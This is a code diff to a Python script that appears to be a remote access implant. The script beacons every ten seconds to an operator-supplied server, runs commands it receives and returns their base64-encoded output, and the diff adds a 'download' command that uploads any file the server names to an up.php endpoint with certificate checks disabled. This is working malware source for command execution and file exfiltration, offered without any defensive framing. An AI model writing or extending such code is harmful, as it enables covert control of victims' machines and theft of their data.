@@ -3,6 +3,7 @@ import base64
 import sys
 import time
 import subprocess
+import os
 
 uid = sys.argv[1]
 url = sys.argv[2]
@@ -29,6 +30,21 @@ while True:
 				resbase64_bytes = base64.b64encode(res_bytes)
 				resbase64 = resbase64_bytes.decode('ascii')
 				gimme = requests.get(url + "/res.php?res=" + resbase64 + "&id="+uid, verify=False)
+				
+			if act == "download":
+				filedl = str(lines.split(":",2)[2]).strip()
+				filenamedl = os.path.split(filedl)[-1]
+				messagedl = "Uploading "+ str(filedl)
+				messagedl_bytes = messagedl.encode('ascii')
+				base64_bytes = base64.b64encode(messagedl_bytes)
+				base64_messagedl = base64_bytes.decode('ascii')
+				multipart_form_data = {
+   				'data': (str(filenamedl).strip(), open(filedl, 'rb')),
+				}
+				tellme = requests.get(url + "/up.php?res=" + base64_messagedl + "&id="+uid, verify=False)
+				gimme = requests.post(url + "/up.php?id="+uid, files=multipart_form_data , verify=False)
+				
+
 	
 	
 	time.sleep(10)
